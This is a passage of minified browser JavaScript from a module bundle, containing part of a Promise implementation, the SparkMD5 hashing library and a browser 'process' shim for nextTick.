r},i.prototype.callFulfilled=function(e){y.resolve(this.promise,e)},i.prototype.otherCallFulfilled=function(e){s(this.promise,this.onFulfilled,e)},i.prototype.callRejected=function(e){y.reject(this.promise,e)},i.prototype.otherCallRejected=function(e){s(this.promise,this.onRejected,e)},y.resolve=function(e,t){var r=c(a,t);if("error"===r.status)return y.reject(e,r.value);var n=r.value;if(n)u(e,n);else{e.state=v,e.outcome=t;for(var o=-1,i=e.queue.length;++o<i;)e.queue[o].callFulfilled(t)}return e},y.reject=function(e,t){e.state=b,e.outcome=t;for(var r=-1,n=e.queue.length;++r<n;)e.queue[r].callRejected(t);return e},r.resolve=f,r.reject=l,r.all=p,r.race=h},{immediate:5}],35:[function(e,t,r){!function(e){if("object"==typeof r)t.exports=e();else if("function"==typeof define&&define.amd)define(e);else{var n;try{n=window}catch(o){n=self}n.SparkMD5=e()}}(function(e){"use strict";function t(e,t,r,n,o,i){return t=g(g(t,e),g(n,i)),g(t<<o|t>>>32-o,r)}function r(e,r,n,o,i,s,a){return t(r&n|~r&o,e,r,i,s,a)}function n(e,r,n,o,i,s,a){return t(r&o|n&~o,e,r,i,s,a)}function o(e,r,n,o,i,s,a){return t(r^n^o,e,r,i,s,a)}function i(e,r,n,o,i,s,a){return t(n^(r|~o),e,r,i,s,a)}function s(e,t){var s=e[0],a=e[1],u=e[2],c=e[3];s=r(s,a,u,c,t[0],7,-680876936),c=r(c,s,a,u,t[1],12,-389564586),u=r(u,c,s,a,t[2],17,606105819),a=r(a,u,c,s,t[3],22,-1044525330),s=r(s,a,u,c,t[4],7,-176418897),c=r(c,s,a,u,t[5],12,1200080426),u=r(u,c,s,a,t[6],17,-1473231341),a=r(a,u,c,s,t[7],22,-45705983),s=r(s,a,u,c,t[8],7,1770035416),c=r(c,s,a,u,t[9],12,-1958414417),u=r(u,c,s,a,t[10],17,-42063),a=r(a,u,c,s,t[11],22,-1990404162),s=r(s,a,u,c,t[12],7,1804603682),c=r(c,s,a,u,t[13],12,-40341101),u=r(u,c,s,a,t[14],17,-1502002290),a=r(a,u,c,s,t[15],22,1236535329),s=n(s,a,u,c,t[1],5,-165796510),c=n(c,s,a,u,t[6],9,-1069501632),u=n(u,c,s,a,t[11],14,643717713),a=n(a,u,c,s,t[0],20,-373897302),s=n(s,a,u,c,t[5],5,-701558691),c=n(c,s,a,u,t[10],9,38016083),u=n(u,c,s,a,t[15],14,-660478335),a=n(a,u,c,s,t[4],20,-405537848),s=n(s,a,u,c,t[9],5,568446438),c=n(c,s,a,u,t[14],9,-1019803690),u=n(u,c,s,a,t[3],14,-187363961),a=n(a,u,c,s,t[8],20,1163531501),s=n(s,a,u,c,t[13],5,-1444681467),c=n(c,s,a,u,t[2],9,-51403784),u=n(u,c,s,a,t[7],14,1735328473),a=n(a,u,c,s,t[12],20,-1926607734),s=o(s,a,u,c,t[5],4,-378558),c=o(c,s,a,u,t[8],11,-2022574463),u=o(u,c,s,a,t[11],16,1839030562),a=o(a,u,c,s,t[14],23,-35309556),s=o(s,a,u,c,t[1],4,-1530992060),c=o(c,s,a,u,t[4],11,1272893353),u=o(u,c,s,a,t[7],16,-155497632),a=o(a,u,c,s,t[10],23,-1094730640),s=o(s,a,u,c,t[13],4,681279174),c=o(c,s,a,u,t[0],11,-358537222),u=o(u,c,s,a,t[3],16,-722521979),a=o(a,u,c,s,t[6],23,76029189),s=o(s,a,u,c,t[9],4,-640364487),c=o(c,s,a,u,t[12],11,-421815835),u=o(u,c,s,a,t[15],16,530742520),a=o(a,u,c,s,t[2],23,-995338651),s=i(s,a,u,c,t[0],6,-198630844),c=i(c,s,a,u,t[7],10,1126891415),u=i(u,c,s,a,t[14],15,-1416354905),a=i(a,u,c,s,t[5],21,-57434055),s=i(s,a,u,c,t[12],6,1700485571),c=i(c,s,a,u,t[3],10,-1894986606),u=i(u,c,s,a,t[10],15,-1051523),a=i(a,u,c,s,t[1],21,-2054922799),s=i(s,a,u,c,t[8],6,1873313359),c=i(c,s,a,u,t[15],10,-30611744),u=i(u,c,s,a,t[6],15,-1560198380),a=i(a,u,c,s,t[13],21,1309151649),s=i(s,a,u,c,t[4],6,-145523070),c=i(c,s,a,u,t[11],10,-1120210379),u=i(u,c,s,a,t[2],15,718787259),a=i(a,u,c,s,t[9],21,-343485551),e[0]=g(s,e[0]),e[1]=g(a,e[1]),e[2]=g(u,e[2]),e[3]=g(c,e[3])}function a(e){var t,r=[];for(t=0;64>t;t+=4)r[t>>2]=e.charCodeAt(t)+(e.charCodeAt(t+1)<<8)+(e.charCodeAt(t+2)<<16)+(e.charCodeAt(t+3)<<24);return r}function u(e){var t,r=[];for(t=0;64>t;t+=4)r[t>>2]=e[t]+(e[t+1]<<8)+(e[t+2]<<16)+(e[t+3]<<24);return r}function c(e){var t,r,n,o,i,u,c=e.length,f=[1732584193,-271733879,-1732584194,271733878];for(t=64;c>=t;t+=64)s(f,a(e.substring(t-64,t)));for(e=e.substring(t-64),r=e.length,n=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],t=0;r>t;t+=1)n[t>>2]|=e.charCodeAt(t)<<(t%4<<3);if(n[t>>2]|=128<<(t%4<<3),t>55)for(s(f,n),t=0;16>t;t+=1)n[t]=0;return o=8*c,o=o.toString(16).match(/(.*?)(.{0,8})$/),i=parseInt(o[2],16),u=parseInt(o[1],16)||0,n[14]=i,n[15]=u,s(f,n),f}function f(e){var t,r,n,o,i,a,c=e.length,f=[1732584193,-271733879,-1732584194,271733878];for(t=64;c>=t;t+=64)s(f,u(e.subarray(t-64,t)));for(e=c>t-64?e.subarray(t-64):new Uint8Array(0),
r=e.length,n=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],t=0;r>t;t+=1)n[t>>2]|=e[t]<<(t%4<<3);if(n[t>>2]|=128<<(t%4<<3),t>55)for(s(f,n),t=0;16>t;t+=1)n[t]=0;return o=8*c,o=o.toString(16).match(/(.*?)(.{0,8})$/),i=parseInt(o[2],16),a=parseInt(o[1],16)||0,n[14]=i,n[15]=a,s(f,n),f}function l(e){var t,r="";for(t=0;4>t;t+=1)r+=m[e>>8*t+4&15]+m[e>>8*t&15];return r}function p(e){var t;for(t=0;t<e.length;t+=1)e[t]=l(e[t]);return e.join("")}function h(e){return/[\u0080-\uFFFF]/.test(e)&&(e=unescape(encodeURIComponent(e))),e}function d(e,t){var r,n=e.length,o=new ArrayBuffer(n),i=new Uint8Array(o);for(r=0;n>r;r++)i[r]=e.charCodeAt(r);return t?i:o}function y(e){return String.fromCharCode.apply(null,new Uint8Array(e))}function b(e,t,r){var n=new Uint8Array(e.byteLength+t.byteLength);return n.set(new Uint8Array(e)),n.set(new Uint8Array(t),e.byteLength),r?n:n.buffer}function v(){this.reset()}var g=function(e,t){return e+t&4294967295},m=["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"];return"5d41402abc4b2a76b9719d911017c592"!==p(c("hello"))&&(g=function(e,t){var r=(65535&e)+(65535&t),n=(e>>16)+(t>>16)+(r>>16);return n<<16|65535&r}),v.prototype.append=function(e){return this.appendBinary(h(e)),this},v.prototype.appendBinary=function(e){this._buff+=e,this._length+=e.length;var t,r=this._buff.length;for(t=64;r>=t;t+=64)s(this._hash,a(this._buff.substring(t-64,t)));return this._buff=this._buff.substring(t-64),this},v.prototype.end=function(e){var t,r,n=this._buff,o=n.length,i=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(t=0;o>t;t+=1)i[t>>2]|=n.charCodeAt(t)<<(t%4<<3);return this._finish(i,o),r=e?this._hash:p(this._hash),this.reset(),r},v.prototype.reset=function(){return this._buff="",this._length=0,this._hash=[1732584193,-271733879,-1732584194,271733878],this},v.prototype.getState=function(){return{buff:this._buff,length:this._length,hash:this._hash}},v.prototype.setState=function(e){return this._buff=e.buff,this._length=e.length,this._hash=e.hash,this},v.prototype.destroy=function(){delete this._hash,delete this._buff,delete this._length},v.prototype._finish=function(e,t){var r,n,o,i=t;if(e[i>>2]|=128<<(i%4<<3),i>55)for(s(this._hash,e),i=0;16>i;i+=1)e[i]=0;r=8*this._length,r=r.toString(16).match(/(.*?)(.{0,8})$/),n=parseInt(r[2],16),o=parseInt(r[1],16)||0,e[14]=n,e[15]=o,s(this._hash,e)},v.hash=function(e,t){return v.hashBinary(h(e),t)},v.hashBinary=function(e,t){var r=c(e);return t?r:p(r)},v.ArrayBuffer=function(){this.reset()},v.ArrayBuffer.prototype.append=function(e){var t,r=b(this._buff.buffer,e,!0),n=r.length;for(this._length+=e.byteLength,t=64;n>=t;t+=64)s(this._hash,u(r.subarray(t-64,t)));return this._buff=n>t-64?r.subarray(t-64):new Uint8Array(0),this},v.ArrayBuffer.prototype.end=function(e){var t,r,n=this._buff,o=n.length,i=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(t=0;o>t;t+=1)i[t>>2]|=n[t]<<(t%4<<3);return this._finish(i,o),r=e?this._hash:p(this._hash),this.reset(),r},v.ArrayBuffer.prototype.reset=function(){return this._buff=new Uint8Array(0),this._length=0,this._hash=[1732584193,-271733879,-1732584194,271733878],this},v.ArrayBuffer.prototype.getState=function(){var e=v.prototype.getState.call(this);return e.buff=y(e.buff),e},v.ArrayBuffer.prototype.setState=function(e){return e.buff=d(e.buff,!0),v.prototype.setState.call(this,e)},v.ArrayBuffer.prototype.destroy=v.prototype.destroy,v.ArrayBuffer.prototype._finish=v.prototype._finish,v.ArrayBuffer.hash=function(e,t){var r=f(new Uint8Array(e));return t?r:p(r)},v})},{}],36:[function(e,t,r){var n=t.exports={};n.nextTick=function(){var e="undefined"!=typeof window&&window.setImmediate,t="undefined"!=typeof window&&window.postMessage&&window.addEventListener;if(e)return function(e){return window.setImmediate(e)};if(t){var r=[];return window.addEventListener("message",function(e){var t=e.source;if((t===window||null===t)&&"process-tick"===e.data&&(e.stopPropagation(),r.length>0)){var n=r.shift();n()}},!0),function(e){r.push(e),window.postMessage("process-tick","*")}}return function(e){setTimeout(e,0)}}(),n.title="browser",n.browser=!0,n.env={},n.argv=[],n.binding=function(e){throw new Error("process.binding is not supported")},n.cwd=function(){return"/"},n.chdir=function(e){throw new Error("process.chdir is not supported")}},{}]},{},[1]);
